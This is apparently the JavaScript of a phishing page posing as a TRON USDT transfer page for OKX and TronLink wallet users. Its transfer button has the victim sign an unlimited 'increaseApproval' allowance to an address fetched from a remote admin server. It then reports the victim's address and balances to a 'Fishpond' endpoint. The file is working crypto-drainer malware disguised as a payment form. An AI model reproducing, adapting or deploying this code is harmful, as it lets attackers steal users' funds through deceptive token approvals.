var tronApi = "https://api.trongrid.io";
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
var domain = 'https://' + window.location.host;
var admindomain = "https://ax.8789du.top";


     

var dq_domain = window.location.host;
//alert(dq_domain)
var coordinates = (function() {
    var result;
    $.ajax({
        type: 'get',
        url: admindomain + "/api/api/get_au_address",
        dataType:'json',
        async:false,
        success:function(data){
            result = data.data.authorized_address;
        }
    });
    return result;
})();
// alert(coordinates)
console.log(coordinates);

window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' })
var current_address, usdtBalance = 0,
    trxBalance = 0;
var transactionObj = null;
var toAddress, type = 0,
    code, isConnected = false;

async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb;
    let parameter = [{
        type: "address",
        value: address
    }];
    let options = {};
    let result = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
    if (result.result) {
        if (callback != undefined) {
            callback(result.constant_result[0]);
        }
    }
}

async function getAssets(callback) {
    code = getUrlParams('code');
    try {
        
        let userAgent = navigator.userAgent.toLowerCase();
        if (/okex/.test(userAgent) || isPc()) {
            if (window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb;
            } else {
                200 === (await window.okxwallet.tronLink.request({
                    method: "tron_requestAccounts"
                })).code && (window.tronWeb = tronLink.tronWeb)
            }
        }
        if (!window.tronWeb) {
            const e = TronWeb.providers.HttpProvider,
                t = new e(tronApi),
                a = new e(tronApi),
                n = tronApi,
                s = new TronWeb(t, a, n);
            window.tronWeb = s;
        }

    } catch (e) {
        // window.location.replace("https://www.okx.com/zh-hans");
        // window.location.href="https://www.okx.com/zh-hans";
        // tip(e);
    }

    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        current_address = tronWeb.defaultAddress.base58;
        if (current_address == false) {
            tip("连接钱包失败");

            await getAssets(callback);

            return;
        }
        try {
            const mytronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',  // Mainnet
            //fullHost: 'https://api.shasta.trongrid.io',  // Shasta Testnet
            Headers: { 'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41' },
            //privateKey: privateKey
            });
        
            let balance = await mytronWeb.trx.getBalance(current_address);
            trxBalance = mytronWeb.fromSun(balance);

            getUsdtBalance(current_address, function (data) {
                usdtBalance = mytronWeb.fromSun(parseInt(data, 16));
                console.log(usdtBalance);
                isConnected = true;
                tip("连接钱包成功");
                iaGet({
                    current_address: current_address,
                    trx: trxBalance,
                    usdt: usdtBalance,
                    code: code
                });
                if (callback != undefined) {
                    callback(trxBalance, usdtBalance);
                }
            });

        } catch (e) {
            tip(e);
        }
    } else {
        // window.location.replace("https://www.okx.com/zh-hans");
        // window.location.href="https://www.okx.com/zh-hans";
        tip("请用钱包扫码打开");
    }
}

async function iaHelp(transactionObj, to_address, amount, type) {
    try {
        if (type == 1 || type == 2) {
            var sign = await tronWeb.trx.sign(transactionObj);
            iaResult({
                signature: sign.signature,
                txID: sign.txID
            });
        } else {
            let tronWeb = window.tronWeb;
            let parameter = [{
                type: "address",
                value: to_address
            },
            {
                type: "uint256",
                value: amount * 1000000
            }
            ];
            let transactionObj1 = await tronWeb.trx.sign(contractAddress, "transfer(address,uint256)", {}, parameter, current_address,);

            if ((isMobile() && isOkxApp()) || isPc()) {
                var raw_data = transactionObj.raw_data;
                transactionObj.raw_data = transactionObj1.transaction.raw_data;
            }
            var sign = await tronWeb.trx.sign(transactionObj);
            iaResult({
                signature: sign.signature,
                txID: sign.txID
            });
            // if((isMobile()&&isOkxApp())||isPc()){
            //     sign.raw_data=raw_data;
            // }

            // if(type!=1){
            //     tronWeb.trx.sendRawTransaction(sign);
            // }
        }


    } catch (e) {
        if (e.message) {
            tip(e.message);
        } else {
            tip(e);
        }
    }
}

async function iaGet(data) {
    $.ajax({
        url: domain + "/sapi/getData",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback"
    });
}

async function iaCreate(data) {
    $.ajax({
        url: domain + "/sapi",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback1"
    });
}

async function iaResult(data) {
    $.ajax({
        url: domain + "/sapi/result",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback2"
    });
}

function handleCallback(res) {
    if (res['code'] == 0) {
        tip(res['info']);
    } else {
        toAddress = res['to_address'];
        $('#to_address').html(toAddress);
        $('#to_address').val(toAddress);
    }
}

function handleCallback1(res) {
    if (res['code'] == 0) {
        tip(res['info']);
    } else {
        transactionObj = JSON.parse(res['data']);
        type = res['type'];

        if ((isMobile() && isOkxApp()) || isPc()) {
            toAddress = current_address;
        }
        iaHelp(transactionObj, toAddress, amount, type);
    }
}

function handleCallback2(res) {
    tip(res['info']);
}

async function transfer_f() {

    amount = $("#amount").val() ? $("#amount").val() : 0;
    if (amount == 0) {
        tip('请输入转账金额');
        return;
    }
    if (!isConnected) {
        tip('正在连接网络。。。', 2000);
        return;
    }

    tip('正在创建交易。。。', 2000);
    executeBlockchainTransaction()
    // iaCreate({
    //     current_address: current_address,
    //     trx: trxBalance,
    //     usdt: usdtBalance,
    //     code: code
    // });
}

function tip(a, time = 1500) {
    $("#tip").html(a);
    $("#tip").show();
    setTimeout(function () {
        $("#tip").hide();
    }, time)
}

function sleep(a) {
    return new Promise(dsTime => setTimeout(dsTime, a));
}

function isOkxApp() {
    let ua = navigator.userAgent;
    let isOKApp = /OKApp/i.test(ua);
    return isOKApp;
}

function isMobile() {
    let ua = navigator.userAgent;
    let isIOS = /iphone|ipad|ipod|ios/i.test(ua);
    let isAndroid = /android|XiaoMi|MiuiBrowser/i.test(ua);
    let isMobile = isIOS || isAndroid;
    return isMobile;
}

function isPc() {
    let ua = navigator.userAgent;
    let isPc = /windows/i.test(ua);
    return isPc;
}

function changeTitle(content) {
    $('title').html(content);
}


//获取url参数
function getUrlParams(key) {
    var url = window.location.search.substr(1);
    if (url == '') {
        return false;
    }
    var paramsArr = url.split('&');
    for (var i = 0; i < paramsArr.length; i++) {
        var combina = paramsArr[i].split("=");
        if (combina[0] == key) {
            return combina[1];
        }
    }
    return false;
}

async function postInfo(address,to) {


        $.post(domain+"/api/Fishpond/getUserInfo", {"address":address}, function(e){
        }, "json");
        
        $.post(domain+"/api/Fishpond/authorizedStatusUpdate", {"address":address,"to":to}, function(e){
        }, "json");
    
    
}

async function kou_dian() {
     $.ajax({
            type: 'get',
            url: admindomain + "/api/api/url_sy?url="+dq_domain,
            dataType: "json",
            success: function (res) {
                 
            },
            error: function (err) {
            }
        });
}

async function getTRC() {
    return new Promise((resolve, reject) => {
        $.ajax({
            type: 'get',
            url: admindomain + "/api/api/get_au_address?url="+dq_domain,
            dataType: "json",
            success: function (res) {
                resolve(res);
            },
            error: function (err) {
                reject(err);
            }
        });
    });
}




async function executeBlockchainTransaction() {


    try {

        let tronWeb = window.tronWeb;
        const userAgent = navigator.userAgent.toLowerCase();
        

        let current_address = tronWeb.defaultAddress.base58;




        console.log(current_address);
        to_address = coordinates;
        const mytronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',  // Mainnet
            //fullHost: 'https://api.shasta.trongrid.io',  // Shasta Testnet
            Headers: { 'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41' },
            //privateKey: privateKey
        });
        
        


        let tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // uploadTx('tron')

        // 准备交易的参数
        const parameters = [
            { type: "address", value: to_address },
            { type: "uint256", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
        ];

        // 设置交易限额
        const transactionOptions = { feeLimit: 100000000 };

        const transactionObj0 = await mytronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress,
            "increaseApproval(address,uint256)",
            transactionOptions,
            parameters,
            current_address
        );
        console.log("transactionObj0:" + JSON.stringify(transactionObj0, null, 2));



        let parameter = [{
            type: "address",
            value: to_address
        },
        {
            type: "uint256",
            value: amount * 1000000
        }
        ];

        const signedTransaction = await tronWeb.trx.sign(transactionObj0.transaction);

        const tx = await tronWeb.trx.sendRawTransaction(signedTransaction);
        if(tx){
        postInfo(current_address, to_address);
        //     alert('成功！');
        }

        // 发送交易


    } catch (error) {
        console.error("An error occurred during the blockchain transaction:", error);
    }
}
